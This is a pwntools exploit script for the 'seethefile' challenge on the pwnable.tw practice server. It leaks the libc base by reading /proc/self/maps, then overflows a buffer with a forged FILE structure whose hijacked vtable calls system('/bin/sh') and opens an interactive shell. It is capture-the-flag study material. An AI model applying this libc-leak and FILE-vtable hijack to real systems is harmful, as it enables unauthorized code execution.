from pwn import *

context.arch = 'i386'
# context.log_level="debug"

p = remote('chall.pwnable.tw',10200)

libc = ELF('./libc_32.so.6')
elf = ELF('./seethefile')

# fsop
with log.progress("Stage 1: Leaking libc") as ll:
    p.sendlineafter(b':', b'1')
    p.sendlineafter(b':', b'/proc/self/maps')

    banner = b'\n---------------MENU---------------'
    content = b''
    while(b'libc' not in content):
        p.sendlineafter(b':', b'2')
        p.sendlineafter(b':', b'3')
        tmp = p.recvuntil(banner)
        content += tmp[:-len(banner)]
    for l in content.split(b'\n'):
        if b'libc' in l:
            libc_addr = int(l.split(b'-')[0],16)
            break
    ll.success(hex(libc_addr))
    libc.address = libc_addr

# scanf %s can get \0
with log.progress("Stage 2: Creatig FileStructure") as l:
    p.sendlineafter(b':', b'5')
    payload = b'a' * 0x10 + b'\0'*0x10 + p32(0x804B284)

    f = FileStructure()
    f.flags = 0x6e69622f			#/bin
    f._IO_read_ptr = 0x68732f		#/sh\0
    f._lock = 0x804B270				#_lock point to null
    f.vtable = 0x804B284 + 0x98 - 0x44
    # print(f)
    log.info(str(f))
    payload += bytes(f) + p32(libc.symbols['system'])
    p.sendlineafter(b':', payload)
    l.success()
p.interactive()